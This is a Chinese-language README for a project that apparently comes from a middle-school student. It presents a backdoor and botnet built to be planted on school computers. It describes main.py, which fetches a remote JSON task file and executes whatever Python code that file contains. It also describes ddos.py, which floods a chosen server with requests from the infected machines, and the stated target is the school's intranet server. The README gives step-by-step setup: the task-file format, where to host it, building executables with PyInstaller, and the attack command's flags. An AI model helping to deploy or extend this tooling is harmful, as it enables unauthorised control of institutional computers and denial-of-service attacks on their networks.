# fuck-school-computer

---

## 干死学校的老爷电脑吧

这是一个咸的梅柿干的初中生无聊时做的项目。。。

用途顾名思义，寄生在学校的电脑上，执行你给的任何指令（例如干掉学校的内网服务器）。

## 功能

`main.py`：远程任意代码执行，通过读取远程服务器上的json格式的任务声明文件，在本地执行任意Python代码（同时以为着你可以通过Python的os库执行任意cmd命令）。

`ddos.py`：顾名思义，这一一个DDos攻击工具，可以向指定服务器不断发送大量请求（利用学校几百台免费的肉鸡）。

## 技术实现

鉴于Python易用的库和简单的语法，本项目使用Python编写，通过Pyinstaller生成可执行文件（`*.exe`）。

所有库均使用Python标准库，无需折腾烦人的pip（乱说的:)doge）。

## 使用方法

使用以下格式编写json任务声明文件：

```json
[
  {
    "id": "这里写任务的唯一ID",
    "time": "这里写任务执行的时间（例如2026-06-27 12:00:00）",
    "code": "这里写任意Python代码（换行使用\n）"
  }
]
```

将你写好的任务声明文件放在你自己的服务器上，或者用支持永久直链的网盘存任务声明文件（推荐使用[Banana Y.X.网盘](https://www.byxpan.qzz.io)）。

找到`main.py`中的这一行代码（第13行）：

```python
TASK_URL = "https://example.com/xxx.json"
```

将引号内的内容改为你任务声明文件的网址。

使用Pyinstaller生成可执行文件（exe），运行即可。

> 使用Pyinstaller为`ddos.py`生成可执行文件，运行时使用命令行参数指定目标攻击服务器，格式：
> 
> ```bash
> ddos.exe -H 目标攻击服务器IP地址或域名 -p 目标端口号（默认80） -t 线程数（默认10） -d 持续时间（秒，默认10）
> ```
> 
> 其中`-H`参数为必填项。
> 
> 该功能结合`main.py`即可实现定时轰炸。
